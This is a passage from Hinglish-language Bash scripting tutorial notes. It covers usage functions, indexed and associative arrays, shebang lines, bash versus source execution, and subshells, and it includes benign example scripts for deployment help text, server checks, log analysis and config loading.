Usage: $0 [OPTIONS]

REQUIRED:
  -e, --env ENV         Environment (dev|staging|prod)
  -a, --app APP         Application name

OPTIONAL:
  -v, --version VER     Version to deploy (default: latest)
  -b, --branch BRANCH   Git branch (default: main)
  -r, --rollback        Rollback to previous version
  -f, --force           Force deployment (skip confirmations)
  -n, --dry-run         Dry run (no actual deployment)
  -h, --help            Show this help
  --version             Show script version

EXAMPLES:
  # Deploy to staging
  $0 -e staging -a myapp

  # Deploy specific version to production
  $0 -e prod -a myapp -v v2.1.0

  # Dry run deployment
  $0 -e prod -a myapp -n

  # Rollback production
  $0 -e prod -a myapp -r

ENVIRONMENT VARIABLES:
  DEPLOY_USER           SSH user (default: deploy)
  DEPLOY_KEY            SSH key path
  SLACK_WEBHOOK         Slack notification webhook

NOTES:
  - Production deployments require confirmation unless -f is used
  - Rollback keeps last 5 versions
  - Logs are stored in /var/log/deploy/

For more information: https://docs.example.com/deploy
EOF
    exit "${1:-0}"
}

show_version() {
    echo "Deployment Script v${VERSION}"
    echo "Copyright (c) 2024"
    exit 0
}

# Parse arguments
while [ $# -gt 0 ]; do
    case $1 in
        -h|--help) usage 0 ;;
        --version) show_version ;;
        -e|--env) ENV=$2; shift ;;
        -a|--app) APP=$2; shift ;;
        -v|--version) VERSION=$2; shift ;;
        *) echo "Unknown option: $1"; usage 1 ;;
    esac
    shift
done

# Validate required
if [ -z "$ENV" ] || [ -z "$APP" ]; then
    echo "Error: Environment and app name required"
    usage 1
fi
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **No usage function:** Users confused
- ❌ **Poor formatting:** Hard to read
- ❌ **No examples:** Users don't know how to use
- ❌ **Outdated help:** Documentation mismatch

### 10. **Best Practices / Pro Tips**
- 💡 **Always include:** Har script mein usage function
- 💡 **Examples zaroori:** Real-world examples do
- 💡 **Exit codes:** `usage 0` for help, `usage 1` for errors
- 💡 **Keep updated:** Code change = help update

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# backup-manager.sh

VERSION="1.0.0"
SCRIPT_NAME=$(basename "$0")

usage() {
    cat << EOF
$SCRIPT_NAME v${VERSION} - Backup Management Tool

USAGE:
  $SCRIPT_NAME <command> [options]

COMMANDS:
  create        Create new backup
  list          List all backups
  restore       Restore from backup
  delete        Delete old backups
  verify        Verify backup integrity

OPTIONS:
  -s, --source DIR      Source directory
  -d, --dest DIR        Destination directory
  -n, --name NAME       Backup name
  -k, --keep NUM        Keep last N backups (default: 7)
  -c, --compress LEVEL  Compression level 1-9 (default: 6)
  -e, --encrypt         Encrypt backup
  -v, --verbose         Verbose output
  -h, --help            Show this help

EXAMPLES:
  # Create backup
  $SCRIPT_NAME create -s /home -d /backups

  # Create encrypted backup
  $SCRIPT_NAME create -s /data -d /backups -e

  # List backups
  $SCRIPT_NAME list -d /backups

  # Restore backup
  $SCRIPT_NAME restore -n backup_20240115 -d /restore

  # Delete old backups (keep last 5)
  $SCRIPT_NAME delete -d /backups -k 5

  # Verify backup
  $SCRIPT_NAME verify -n backup_20240115

CONFIGURATION:
  Config file: ~/.backup-manager.conf
  Log file: /var/log/backup-manager.log

BACKUP NAMING:
  Format: backup_YYYYMMDD_HHMMSS.tar.gz
  Example: backup_20240115_143022.tar.gz

EXIT CODES:
  0  Success
  1  General error
  2  Invalid arguments
  3  Source not found
  4  Insufficient space
  5  Backup failed

SUPPORT:
  Report bugs: https://github.com/user/backup-manager/issues
  Documentation: https://docs.example.com/backup-manager
EOF
    exit "${1:-0}"
}

# Command dispatcher
case "${1:-}" in
    create|list|restore|delete|verify)
        COMMAND=$1
        shift
        ;;
    -h|--help|help|"")
        usage 0
        ;;
    *)
        echo "Error: Unknown command: $1"
        echo "Run '$SCRIPT_NAME --help' for usage"
        exit 2
        ;;
esac
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ Usage function mandatory
- ✅ Clear formatting
- ✅ Examples include karo
- ✅ Exit codes proper
- ✅ Keep documentation updated

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Usage function kab call karu?**
A: `-h` flag par, invalid arguments par, ya no arguments par.

**Q2: Kya colors use kar sakte hain?**
A: Haan, lekin optional rakho (pipes mein problem ho sakti hai).

**Q3: Long help vs short help?**
A: Short help default, `--help` par detailed.

### 14. **Practice ke liye Task**

```bash
#!/bin/bash
# practice.sh

usage() {
    cat << EOF
Usage: $0 [OPTIONS] <file>

Process a file

Options:
  -h    Show help
  -v    Verbose
  -o    Output file

Example:
  $0 -v -o out.txt input.txt
EOF
    exit 1
}

[ "$1" = "-h" ] && usage
[ $# -eq 0 ] && usage

echo "Processing..."
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📖 Usage function = professional script
- 📝 Clear format, examples zaroori
- ✅ `-h` flag hamesha implement
- 🔢 Proper exit codes use karo
- 📚 Documentation updated rakho

> **💡 Ye Zaroor Yaad Rakhein:**
> Usage function har professional script mein mandatory hai! Clear formatting, real examples, aur proper exit codes - yeh user-friendly scripts ki pehchan hai!

---

## **Topic 5: Indexed Arrays (`arr=()`, `arr[0]="val"`, Accessing `${arr[0]}`, All items `${arr[@]}`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Indexed Arrays** - Multiple values ek variable mein store karna.

### 2. **Ye Kya Hai? (What is it?)**
Arrays multiple values ko ek naam ke neeche store karte hain, har value ka ek index (0, 1, 2...) hota hai. Yeh lists aur collections handle karne ke liye essential hain.

**Analogy:** Array ek numbered locker system hai - har locker ka ek number hai (index) aur usme kuch stored hai (value).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Multiple values** - Ek variable mein
- ✅ **Iteration** - Loops ke saath perfect
- ✅ **Data structures** - Lists, queues
- ✅ **Batch operations** - Multiple items process

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Multiple related values
- Lists maintain karna
- Batch processing
- Configuration data

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Multiple variables (messy)
- No iteration capability
- Poor data organization
- Limited functionality

### 6. **Syntax aur Common Options**

```bash
# Declaration
arr=()                    # Empty
arr=(val1 val2 val3)      # With values
arr[0]="value"            # Single element

# Access
${arr[0]}                 # First element
${arr[@]}                 # All elements
${arr[*]}                 # All (as string)
${#arr[@]}                # Length
${!arr[@]}                # All indices

# Operations
arr+=(new_val)            # Append
unset arr[2]              # Delete element
```

### 7. **Example 1 (Basic)**

```bash
# Create array
fruits=("apple" "banana" "cherry")

# Access
echo ${fruits[0]}         # apple
echo ${fruits[1]}         # banana

# All elements
echo ${fruits[@]}         # apple banana cherry

# Length
echo ${#fruits[@]}        # 3

# Loop
for fruit in "${fruits[@]}"; do
    echo "Fruit: $fruit"
done

# Add element
fruits+=("date")
echo ${#fruits[@]}        # 4

# Modify
fruits[1]="blueberry"
echo ${fruits[1]}         # blueberry
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Server management with arrays

# Server list
SERVERS=(
    "web1.example.com"
    "web2.example.com"
    "db1.example.com"
    "cache1.example.com"
)

# Status tracking
declare -a STATUS
declare -a RESPONSE_TIME

check_server() {
    local server=$1
    local index=$2
    
    echo "Checking: $server"
    
    local start=$(date +%s%N)
    
    if ping -c 1 -W 2 "$server" &>/dev/null; then
        local end=$(date +%s%N)
        local duration=$(( (end - start) / 1000000 ))
        
        STATUS[$index]="UP"
        RESPONSE_TIME[$index]="${duration}ms"
        echo "  ✓ UP (${duration}ms)"
    else
        STATUS[$index]="DOWN"
        RESPONSE_TIME[$index]="N/A"
        echo "  ✗ DOWN"
    fi
}

# Check all servers
for i in "${!SERVERS[@]}"; do
    check_server "${SERVERS[$i]}" "$i"
done

# Summary
echo ""
echo "=== Summary ==="
for i in "${!SERVERS[@]}"; do
    printf "%-25s %-6s %s\n" \
        "${SERVERS[$i]}" \
        "${STATUS[$i]}" \
        "${RESPONSE_TIME[$i]}"
done

# Count status
up_count=0
down_count=0

for status in "${STATUS[@]}"; do
    if [ "$status" = "UP" ]; then
        ((up_count++))
    else
        ((down_count++))
    fi
done

echo ""
echo "Total: ${#SERVERS[@]}"
echo "UP: $up_count"
echo "DOWN: $down_count"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes bhoolna:** `${arr[@]}` ki jagah `"${arr[@]}"`
- ❌ **`@` vs `*`:** `@` safer hai
- ❌ **Index bounds:** Check karo element exists

### 10. **Best Practices / Pro Tips**
- 💡 **Quotes hamesha:** `"${arr[@]}"` safe
- 💡 **`@` prefer karo:** `*` se better
- 💡 **Length check:** `${#arr[@]}` se validate
- 💡 **Indices:** `${!arr[@]}` useful hai

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Log analyzer with arrays

# Log files
LOG_FILES=(
    "/var/log/apache2/access.log"
    "/var/log/apache2/error.log"
    "/var/log/mysql/error.log"
    "/var/log/syslog"
)

# Results
declare -a ERROR_COUNTS
declare -a WARNING_COUNTS
declare -a FILE_SIZES

analyze_log() {
    local file=$1
    local index=$2
    
    if [ ! -f "$file" ]; then
        ERROR_COUNTS[$index]=0
        WARNING_COUNTS[$index]=0
        FILE_SIZES[$index]="N/A"
        return 1
    fi
    
    ERROR_COUNTS[$index]=$(grep -c "ERROR" "$file" 2>/dev/null || echo 0)
    WARNING_COUNTS[$index]=$(grep -c "WARN" "$file" 2>/dev/null || echo 0)
    FILE_SIZES[$index]=$(du -h "$file" | cut -f1)
}

# Analyze all logs
for i in "${!LOG_FILES[@]}"; do
    echo "Analyzing: ${LOG_FILES[$i]}"
    analyze_log "${LOG_FILES[$i]}" "$i"
done

# Report
echo ""
echo "=== Log Analysis Report ==="
printf "%-40s %-8s %-10s %-8s\n" "File" "Size" "Errors" "Warnings"
echo "================================================================"

for i in "${!LOG_FILES[@]}"; do
    printf "%-40s %-8s %-10s %-8s\n" \
        "$(basename ${LOG_FILES[$i]})" \
        "${FILE_SIZES[$i]}" \
        "${ERROR_COUNTS[$i]}" \
        "${WARNING_COUNTS[$i]}"
done

# Totals
total_errors=0
total_warnings=0

for count in "${ERROR_COUNTS[@]}"; do
    ((total_errors += count))
done

for count in "${WARNING_COUNTS[@]}"; do
    ((total_warnings += count))
done

echo ""
echo "Total Errors: $total_errors"
echo "Total Warnings: $total_warnings"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `arr=(val1 val2)` create
- ✅ `${arr[0]}` access element
- ✅ `"${arr[@]}"` all elements
- ✅ `${#arr[@]}` length
- ✅ Quotes hamesha use karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `@` aur `*` mein kya fark hai?**
A: `"${arr[@]}"` har element alag, `"${arr[*]}"` sab ek string.

**Q2: Empty array kaise check karu?**
A: `[ ${#arr[@]} -eq 0 ]`

**Q3: Array ko sort kaise karu?**
A: `IFS=$'\n' sorted=($(sort <<<"${arr[*]}"))`

### 14. **Practice ke liye Task**

```bash
# 1. Create array
colors=("red" "green" "blue")

# 2. Access
echo ${colors[0]}
echo ${colors[@]}

# 3. Length
echo ${#colors[@]}

# 4. Loop
for color in "${colors[@]}"; do
    echo $color
done

# 5. Add element
colors+=("yellow")

# 6. Modify
colors[1]="orange"

# 7. All indices
echo ${!colors[@]}
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📦 Arrays multiple values store
- 🔢 Index-based access: `${arr[0]}`
- 📋 All elements: `"${arr[@]}"`
- 📏 Length: `${#arr[@]}`
- 💬 Quotes mandatory for safety

> **💡 Ye Zaroor Yaad Rakhein:**
> Arrays powerful data structure hain! Hamesha quotes use karo `"${arr[@]}"`, `@` prefer karo `*` se, aur length check karo operations se pehle!

---

## **Topic 6: Associative Arrays (Key-Value pairs)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Associative Arrays** - Key-value pairs store karna (like dictionaries/maps).

### 2. **Ye Kya Hai? (What is it?)**
Associative arrays (Bash 4+) key-value pairs store karte hain jahan keys strings ho sakte hain. Yeh dictionaries/hash maps jaisa hai.

**Analogy:** Associative array ek phone book hai - naam (key) se number (value) dhoondhte hain, index numbers se nahi.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Named keys** - Meaningful identifiers
- ✅ **Configuration** - Settings store
- ✅ **Lookup tables** - Fast access
- ✅ **Data mapping** - Relationships

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Configuration data
- Lookup tables
- Counting/grouping
- Named data storage

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Complex workarounds
- Poor data organization
- Inefficient lookups
- Limited functionality

### 6. **Syntax aur Common Options**

```bash
# Declaration (Bash 4+)
declare -A assoc_arr

# Assignment
assoc_arr[key]="value"
assoc_arr["name"]="John"

# Access
${assoc_arr[key]}
${assoc_arr[@]}      # All values
${!assoc_arr[@]}     # All keys
${#assoc_arr[@]}     # Count

# Check if key exists
[[ -v assoc_arr[key] ]]
```

### 7. **Example 1 (Basic)**

```bash
# Declare
declare -A config

# Set values
config[host]="localhost"
config[port]="8080"
config[debug]="true"

# Access
echo ${config[host]}      # localhost
echo ${config[port]}      # 8080

# All keys
for key in "${!config[@]}"; do
    echo "$key = ${config[$key]}"
done

# Check key exists
if [[ -v config[host] ]]; then
    echo "Host is configured"
fi

# Count
echo "Settings: ${#config[@]}"
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# User management with associative arrays

declare -A USERS
declare -A USER_ROLES
declare -A USER_STATUS

# Load users
load_users() {
    USERS[admin]="admin@example.com"
    USERS[john]="john@example.com"
    USERS[jane]="jane@example.com"
    
    USER_ROLES[admin]="administrator"
    USER_ROLES[john]="developer"
    USER_ROLES[jane]="developer"
    
    USER_STATUS[admin]="active"
    USER_STATUS[john]="active"
    USER_STATUS[jane]="inactive"
}

# Get user info
get_user_info() {
    local username=$1
    
    if [[ ! -v USERS[$username] ]]; then
        echo "User not found: $username"
        return 1
    fi
    
    echo "Username: $username"
    echo "Email: ${USERS[$username]}"
    echo "Role: ${USER_ROLES[$username]}"
    echo "Status: ${USER_STATUS[$username]}"
}

# List all users
list_users() {
    echo "=== User List ==="
    printf "%-15s %-25s %-15s %-10s\n" "Username" "Email" "Role" "Status"
    echo "================================================================"
    
    for user in "${!USERS[@]}"; do
        printf "%-15s %-25s %-15s %-10s\n" \
            "$user" \
            "${USERS[$user]}" \
            "${USER_ROLES[$user]}" \
            "${USER_STATUS[$user]}"
    done
}

# Count by role
count_by_role() {
    declare -A role_count
    
    for user in "${!USER_ROLES[@]}"; do
        local role="${USER_ROLES[$user]}"
        ((role_count[$role]++))
    done
    
    echo "=== Users by Role ==="
    for role in "${!role_count[@]}"; do
        echo "$role: ${role_count[$role]}"
    done
}

# Count by status
count_by_status() {
    declare -A status_count
    
    for user in "${!USER_STATUS[@]}"; do
        local status="${USER_STATUS[$user]}"
        ((status_count[$status]++))
    done
    
    echo "=== Users by Status ==="
    for status in "${!status_count[@]}"; do
        echo "$status: ${status_count[$status]}"
    done
}

load_users
list_users
echo ""
count_by_role
echo ""
count_by_status
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`declare -A` bhoolna:** Mandatory hai
- ❌ **Bash version:** 4.0+ chahiye
- ❌ **Key existence:** Check karo pehle

### 10. **Best Practices / Pro Tips**
- 💡 **Always declare:** `declare -A` zaroori
- 💡 **Check existence:** `[[ -v arr[key] ]]`
- 💡 **Meaningful keys:** Descriptive names
- 💡 **Version check:** Bash 4+ verify karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Configuration manager

declare -A CONFIG
declare -A ENV_VARS

load_config() {
    local file=$1
    
    while IFS='=' read -r key value; do
        [[ -z $key || $key == \#* ]] && continue
        CONFIG[$key]=$value
    done < "$file"
}

get_config() {
    local key=$1
    local default=$2
    
    if [[ -v CONFIG[$key] ]]; then
        echo "${CONFIG[$key]}"
    else
        echo "${default}"
    fi
}

set_env_vars() {
    ENV_VARS[APP_NAME]=$(get_config "app_name" "myapp")
    ENV_VARS[APP_PORT]=$(get_config "port" "8080")
    ENV_VARS[DB_HOST]=$(get_config "db_host" "localhost")
    ENV_VARS[DB_NAME]=$(get_config "db_name" "mydb")
    ENV_VARS[DEBUG]=$(get_config "debug" "false")
}

export_env() {
    for key in "${!ENV_VARS[@]}"; do
        export "$key=${ENV_VARS[$key]}"
        echo "Exported: $key=${ENV_VARS[$key]}"
    done
}

load_config "app.conf"
set_env_vars
export_env
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `declare -A arr` mandatory
- ✅ `arr[key]="value"` set
- ✅ `${arr[key]}` get
- ✅ `${!arr[@]}` all keys
- ✅ Bash 4+ required

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Bash version kaise check karu?**
A: `echo $BASH_VERSION` - 4.0+ chahiye

**Q2: Key delete kaise karu?**
A: `unset arr[key]`

**Q3: Nested arrays possible hain?**
A: Nahi directly, workarounds use karo

### 14. **Practice ke liye Task**

```bash
# 1. Declare
declare -A person

# 2. Set values
person[name]="John"
person[age]="30"
person[city]="NYC"

# 3. Access
echo ${person[name]}

# 4. All keys
for key in "${!person[@]}"; do
    echo "$key: ${person[$key]}"
done

# 5. Check key
[[ -v person[name] ]] && echo "Name exists"

# 6. Count
echo "Fields: ${#person[@]}"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🗝️ Key-value pairs (Bash 4+)
- 📝 `declare -A` mandatory
- 🔍 `${!arr[@]}` all keys
- ✅ Check existence: `[[ -v arr[key] ]]`
- 💼 Perfect for configs, lookups

> **💡 Ye Zaroor Yaad Rakhein:**
> Associative arrays powerful hain lekin Bash 4+ chahiye! `declare -A` mandatory, meaningful keys use karo, aur existence check karo access se pehle!

---

# **🎉 Module 10 Complete! 🎉**

Congratulations! Aapne **Module 10: Functions & Arrays** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **Functions** - Reusable code blocks
✅ **Function Arguments** - `$1, $2`, `return`
✅ **Variable Scope** - `local` vs global
✅ **Usage Function** - Professional help
✅ **Indexed Arrays** - `arr=(val1 val2)`
✅ **Associative Arrays** - Key-value pairs

## **Key Patterns:**

```bash
# Functions
my_func() {
    local arg=$1
    echo "result"
    return 0
}

# Usage function
usage() {
    cat << EOF
Usage: $0 [OPTIONS]
...
EOF
    exit 1
}

# Indexed array
arr=("a" "b" "c")
for item in "${arr[@]}"; do
    echo "$item"
done

# Associative array (Bash 4+)
declare -A config
config[key]="value"
echo ${config[key]}
```

## **Best Practices:**
- Functions: `local` variables, single responsibility
- Always implement usage function
- Arrays: quotes mandatory `"${arr[@]}"`
- Associative: `declare -A`, check existence

## **Next Steps:**
Ab aap ready hain **Module 11: The Shell Environment** ke liye!

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 11)**

---

## **PART 3: BUILDING REAL SCRIPTS**

---

# **Module 11: The Shell Environment**

---

## **Topic 1: Shebang (`#!/bin/bash`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Shebang** - Script ko executable banane ka pehla step.

### 2. **Ye Kya Hai? (What is it?)**
Shebang (`#!`) script ki pehli line hai jo batata hai ki script ko kaunsa interpreter run karega. `#!/bin/bash` matlab Bash shell use karo.

**Analogy:** Shebang ek label hai jo batata hai ki yeh package kaise open karna hai - kaunsa tool use karna hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Portability** - Correct interpreter
- ✅ **Executable** - Direct execution
- ✅ **Clarity** - Explicit interpreter
- ✅ **Best practice** - Professional standard

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Har executable script mein
- Production scripts
- Shared scripts
- Command-line tools

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Wrong interpreter use hoga
- Script fail ho sakti hai
- Portability issues
- Unpredictable behavior

### 6. **Syntax aur Common Options**

```bash
#!/bin/bash              # Bash shell
#!/bin/sh                # POSIX shell
#!/usr/bin/env bash      # Portable (finds bash in PATH)
#!/usr/bin/env python3   # Python script
```

### 7. **Example 1 (Basic)**

```bash
#!/bin/bash
# Simple script with shebang

echo "Hello from Bash!"
echo "Bash version: $BASH_VERSION"

# Make executable: chmod +x script.sh
# Run: ./script.sh
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/usr/bin/env bash
# Portable shebang - finds bash in PATH

set -euo pipefail  # Strict mode

# Check Bash version
if [ "${BASH_VERSINFO[0]}" -lt 4 ]; then
    echo "Error: Bash 4+ required" >&2
    exit 1
fi

echo "Running with Bash ${BASH_VERSION}"
echo "Script: $0"
echo "PID: $$"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Space dena:** `#! /bin/bash` galat, `#!/bin/bash` sahi
- ❌ **Second line par:** Pehli line par hona chahiye
- ❌ **Wrong path:** `/bin/bash` check karo exists

### 10. **Best Practices / Pro Tips**
- 💡 **`/usr/bin/env`:** Portable scripts ke liye
- 💡 **Pehli line:** Hamesha first line
- 💡 **No spaces:** `#!` ke beech space nahi
- 💡 **Verify path:** `which bash` se check karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/usr/bin/env bash
# Production deployment script

set -euo pipefail
IFS=$'\n\t'

readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_NAME="$(basename "$0")"

main() {
    echo "Deployment started..."
    # Deployment logic
}

main "$@"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `#!/bin/bash` pehli line
- ✅ `/usr/bin/env bash` portable
- ✅ No spaces in `#!`
- ✅ Executable: `chmod +x`
- ✅ Hamesha include karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `#!/bin/bash` vs `#!/bin/sh` mein kya fark hai?**
A: `bash` Bash-specific features, `sh` POSIX-compliant.

**Q2: `/usr/bin/env bash` kyun use karu?**
A: Portable - bash ko PATH mein dhoondhta hai.

**Q3: Shebang ke bina script chalegi?**
A: Haan, lekin `bash script.sh` explicitly call karna padega.

### 14. **Practice ke liye Task**

```bash
#!/bin/bash
# test.sh

echo "Shebang working!"
echo "Bash: $BASH_VERSION"

# Make executable:
# chmod +x test.sh
# Run: ./test.sh
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔝 Pehli line: `#!/bin/bash`
- 🌍 Portable: `#!/usr/bin/env bash`
- 🚫 No spaces in `#!`
- ✅ Executable banao: `chmod +x`
- 📝 Professional standard

> **💡 Ye Zaroor Yaad Rakhein:**
> Shebang har executable script ki pehli line! `/usr/bin/env bash` portable hai, no spaces, aur `chmod +x` mat bhoolna!

---

## **Topic 2: Running Scripts (`bash script.sh` vs `source script.sh`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Running Scripts** - Scripts execute karne ke different tareeke.

### 2. **Ye Kya Hai? (What is it?)**
Scripts run karne ke teen main tareeke hain: `bash script.sh` (subshell), `./script.sh` (executable), aur `source script.sh` (current shell). Har tarike ka alag behavior hai.

**Analogy:** `bash script.sh` ek alag room mein kaam karna hai (isolated), `source` same room mein kaam karna hai (shared environment).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Environment control** - Variables, functions
- ✅ **Isolation** - Side effects avoid
- ✅ **Configuration** - Settings load
- ✅ **Testing** - Different contexts

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- `bash script.sh`: Normal execution
- `./script.sh`: Executable scripts
- `source`: Config files, environment setup

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Wrong execution method
- Environment pollution
- Variables not persisting
- Unexpected behavior

### 6. **Syntax aur Common Options**

```bash
# Method 1: Subshell (new process)
bash script.sh

# Method 2: Executable (needs chmod +x)
./script.sh

# Method 3: Current shell (no subshell)
source script.sh
. script.sh          # Same as source

# Method 4: Explicit interpreter
sh script.sh
python3 script.py
```

### 7. **Example 1 (Basic)**

```bash
# test.sh
VAR="hello"
echo "Inside script: $VAR"

# Terminal:
$ bash test.sh
Inside script: hello
$ echo $VAR
(empty - variable not in parent shell)

# With source:
$ source test.sh
Inside script: hello
$ echo $VAR
hello (variable persists!)
```

### 8. **Example 2 (Advanced/Script)**

```bash
# config.sh - Configuration file
export DB_HOST="localhost"
export DB_PORT="5432"
export DB_NAME="myapp"

setup_environment() {
    export PATH="$HOME/bin:$PATH"
    export EDITOR="vim"
}

setup_environment

# app.sh - Application script
#!/bin/bash

# Load configuration
source ./config.sh

echo "DB Host: $DB_HOST"
echo "DB Port: $DB_PORT"
echo "Connecting to database..."

# Use configuration
psql -h "$DB_HOST" -p "$DB_PORT" -d "$DB_NAME"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`source` vs `bash` confuse:** Different behavior
- ❌ **`./script.sh` without `chmod +x`:** Permission denied
- ❌ **Expecting variables to persist:** Subshell mein nahi hota

### 10. **Best Practices / Pro Tips**
- 💡 **Config files:** `source` use karo
- 💡 **Normal scripts:** `./script.sh` prefer karo
- 💡 **Testing:** `bash -x script.sh` debug ke liye
- 💡 **Isolation:** Subshell safe hai

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
# .env - Environment configuration
export APP_ENV="production"
export APP_PORT="8080"
export LOG_LEVEL="info"

# deploy.sh - Deployment script
#!/bin/bash

set -euo pipefail

# Load environment
if [ -f ".env" ]; then
    source .env
    echo "✓ Environment loaded"
else
    echo "✗ .env file not found"
    exit 1
fi

echo "Deploying in $APP_ENV mode..."
echo "Port: $APP_PORT"
echo "Log level: $LOG_LEVEL"

# Start application
./app --port "$APP_PORT" --log-level "$LOG_LEVEL"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `bash script.sh` - Subshell
- ✅ `./script.sh` - Executable
- ✅ `source script.sh` - Current shell
- ✅ Config files: `source`
- ✅ Normal scripts: `./`

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `source` aur `.` mein kya fark hai?**
A: Koi fark nahi, dono same hain. `.` POSIX-compliant hai.

**Q2: Subshell mein variables kyun persist nahi hote?**
A: Subshell alag process hai, parent shell ko affect nahi karta.

**Q3: Kab `source` use karu?**
A: Config files, environment setup, function libraries.

### 14. **Practice ke liye Task**

```bash
# config.sh
VAR="test"
echo "Config loaded"

# Test 1: bash (subshell)
bash config.sh
echo $VAR  # Empty

# Test 2: source (current shell)
source config.sh
echo $VAR  # test

# Test 3: executable
chmod +x config.sh
./config.sh
echo $VAR  # Empty
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔄 `bash script.sh` - Subshell (isolated)
- ▶️ `./script.sh` - Executable (needs chmod)
- 📥 `source script.sh` - Current shell (shared)
- ⚙️ Config files: `source` use karo
- 🎯 Normal scripts: `./` prefer karo

> **💡 Ye Zaroor Yaad Rakhein:**
> Execution method matters! Config files ke liye `source`, normal scripts ke liye `./`, aur testing ke liye `bash`. Subshell vs current shell samjho!

---

## **Topic 3: Subshells (Concept) & `exit`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Subshells** - Isolated execution environments aur exit behavior.

### 2. **Ye Kya Hai? (What is it?)**
Subshell ek child process hai jo parent shell se alag environment mein execute hota hai. `exit` command script/shell ko terminate karta hai with exit code.

**Analogy:** Subshell ek sandbox hai - andar jo bhi karo, bahar affect nahi hota. Exit ek emergency exit button hai jo process band kar deta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Isolation** - Side effects avoid
- ✅ **Parallel execution** - Background jobs
- ✅ **Error handling** - Exit codes
- ✅ **Clean termination** - Proper exit

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Isolation chahiye
- Background jobs
- Error handling
- Script termination

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Environment pollution
- Unexpected side effects
- Poor error handling
- Resource leaks

### 6. **Syntax aur Common Options**

```bash
# Subshell creation
( commands )          # Explicit subshell
command &             # Background (subshell)
command | command     # Pipeline (subshells)

# Exit
exit                  # Exit with last status
exit 0                # Success
exit 1                # Error
exit $?               # Exit with last status
```

### 7. **Example 1 (Basic)**

```bash
# Subshell example
VAR="parent"
echo "Parent: $VAR"

( 
    VAR="child"
    echo "Child: $VAR"
)

echo "After subshell: $VAR"  # Still "parent"

# Exit example
#!/bin/bash
if [ ! -f "required.txt" ]; then
    echo "Error: File not found"
    exit 1
fi

echo "Processing..."
exit 0
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Parallel processing with subshells

process_file() {
    local file=$1
    local output="processed_${file}"
    
    (
        # Subshell - isolated environment
        echo "Processing: $file"
        sleep 2
        cat "$file" | tr '[:lower:]' '[:upper:]' > "$output"
        echo "✓ Done: $file"
    ) &
}

# Process files in parallel
for file in *.txt; do
    process_file "$file"
done

# Wait for all background jobs
wait

echo "All files processed"

# Exit handling
cleanup() {
    echo "Cleaning up..."
    rm -f /tmp/temp_*
}

trap cleanup EXIT

# Script logic
if [ $# -eq 0 ]; then
    echo "Usage: $0 <files>"
    exit 1
fi

# Process
for file in "$@"; do
    if [ ! -f "$file" ]; then
        echo "Error: $file not found"
        exit 2
    fi
done

exit 0
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`exit` in subshell:** Sirf subshell exit hoga
- ❌ **Variables expecting to persist:** Subshell isolated hai
- ❌ **Exit code ignore:** `$?` check karo

### 10. **Best Practices / Pro Tips**
- 💡 **Explicit subshells:** `( )` use karo clarity ke liye
- 💡 **Exit codes:** 0=success, 1-255=errors
- 💡 **Cleanup:** `trap` use karo exit par
- 💡 **Background jobs:** `wait` use karo

